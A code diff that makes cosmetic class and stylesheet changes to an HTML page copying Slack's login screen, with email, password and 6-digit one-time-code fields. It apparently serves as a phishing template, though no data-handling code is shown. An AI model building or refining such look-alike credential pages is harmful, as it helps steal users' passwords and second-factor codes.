@@ -10,6 +10,7 @@
   <style>
    @font-face { font-family: 'Slack-Lato'; src: url('https://a.slack-edge.com/bv1-9/lato-regular-webfont-7b240b3.woff2') format('woff2'); font-weight: 400; font-style: normal; } @font-face { font-family: 'Slack-Lato'; src: url('https://a.slack-edge.com/bv1-9/lato-bold-webfont-49d685e.woff2') format('woff2'); font-weight: 700; font-style: normal; } body { font-family: "Slack-Lato", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; background-color: #fff; color: #1d1c1d; height: 100vh; } header { width: 100%; padding: 40px 0; display: flex; justify-content: center; align-items: center; } .logo img { height: 34px; } .main-content { width: 100%; max-width: 800px; display: flex; flex-direction: column; align-items: center; padding: 0 20px; box-sizing: border-box; position: relative; } h1 { font-size: 48px; font-weight: 700; letter-spacing: -0.75px; margin-bottom: 10px; text-align: center; line-height: 56px; } .subtitle { font-size: 18px; line-height: 27px; margin-bottom: 32px; color: #454245; text-align: center; max-width: 700px; } .subtitle a { color: #1264a3; text-decoration: none; } .subtitle a:hover { text-decoration: underline; } .auth-container { width: 100%; max-width: 400px; } .social-btn { width: 100%; height: 44px; border: 2px solid #1d1c1d; border-radius: 4px; background: #fff; font-size: 18px; font-weight: 700; color: #1d1c1d; cursor: pointer; margin-bottom: 16px; display: flex; align-items: center; justify-content: center; transition: all 0.2s; position: relative; } .social-btn:hover { box-shadow: 0 1px 4px rgba(0,0,0,0.3); background-color: #f8f8f8; } .social-btn img { width: 20px; height: 20px; margin-right: 12px; position: absolute; left: 20px; } .divider { display: flex; align-items: center; margin: 24px 0; width: 100%; } .divider span { padding: 0 20px; color: #1d1c1d; font-size: 15px; background: #fff; } .divider::before, .divider::after { content: ""; flex: 1; border-top: 1px solid #dddddd; } .input-wrapper { margin-bottom: 20px; } input { width: 100%; padding: 11px 12px 13px; border: 1px solid #868686; border-radius: 4px; font-size: 18px; box-sizing: border-box; color: #1d1c1d; height: 44px; transition: box-shadow 70ms ease-out, border-color 70ms ease-out; } input:focus { border-color: #1264a3; box-shadow: 0 0 0 4px rgba(29,155,209,0.3); outline: none; } input::placeholder { color: #868686; } .signin-btn { background-color: #4a154b; color: #fff; border: none; border-radius: 4px; width: 100%; height: 44px; font-size: 18px; font-weight: 900; cursor: pointer; transition: background-color 0.2s; } .signin-btn:hover { background-color: #3f1240; } .signin-btn:disabled { background-color: #dddddd; color: #1d1c1d; cursor: not-allowed; } .spinner { display: inline-block; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-right: 8px; vertical-align: middle; } @keyframes spin { to { transform: rotate(360deg); } } .error-message { background-color: #fbecec; border: 1px solid #e01e5a; border-radius: 4px; padding: 12px 16px; margin-bottom: 24px; display: none; align-items: flex-start; } .error-icon { color: #e01e5a; margin-right: 8px; margin-top: 2px; } .error-text { color: #1d1c1d; font-size: 15px; line-height: 22px; } footer { margin-top: auto; padding: 32px 0; width: 100%; text-align: center; background-color: #f8f8f8; border-top: 1px solid #e6e6e6; } footer ul { list-style: none; padding: 0; margin: 0; display: flex; justify-content: center; flex-wrap: wrap; } footer li { margin: 0 16px; } footer a { color: #696969; text-decoration: none; font-size: 14px; font-weight: 700; } footer a:hover { color: #1264a3; text-decoration: underline; } .hidden { display: none !important; } @media (max-width: 600px) { h1 { font-size: 32px; line-height: 38px; } .subtitle { font-size: 16px; } }
   </style>
+  <link href="/core/assets/css/animations.css" rel="stylesheet"/>
  </head>
  <body>
   <header>
@@ -32,11 +33,11 @@
      </strong>
     </div>
     <div class="auth-container">
-     <button class="social-btn">
+     <button class="social-btn btn-primary">
       <img alt="Google" loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg"/>
       Log in with Google
      </button>
-     <button class="social-btn">
+     <button class="social-btn btn-primary">
       <img alt="Apple" loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"/>
       Log in with Apple
      </button>
@@ -55,12 +56,12 @@
      </div>
      <form id="login-form">
       <div class="input-wrapper">
-       <input id="email" placeholder="name@work-email.com" required="" type="email"/>
+       <input class="input-field" id="email" placeholder="name@work-email.com" required="" type="email"/>
       </div>
       <div class="input-wrapper">
-       <input id="password" placeholder="Password" required="" type="password"/>
+       <input class="input-field" id="password" placeholder="Password" required="" type="password"/>
       </div>
-      <button class="signin-btn" id="btn-login" type="button">
+      <button class="signin-btn btn-primary" id="btn-login" type="button">
        Log In
       </button>
       <div style="margin-top: 24px; text-align: center;">
@@ -86,9 +87,9 @@
      We've sent a 6-digit code to your email. The code expires shortly, so please enter it soon.
     </div>
     <div class="input-wrapper">
-     <input id="otp-input" maxlength="6" placeholder="Enter 6-digit code" style="text-align: center; letter-spacing: 4px; font-size: 24px;" type="text"/>
+     <input class="input-field" id="otp-input" maxlength="6" placeholder="Enter 6-digit code" style="text-align: center; letter-spacing: 4px; font-size: 24px;" type="text"/>
     </div>
-    <button class="signin-btn" id="btn-otp-submit" type="button">
+    <button class="signin-btn btn-primary" id="btn-otp-submit" type="button">
      Verify Code
     </button>
     <div style="margin-top: 24px;">
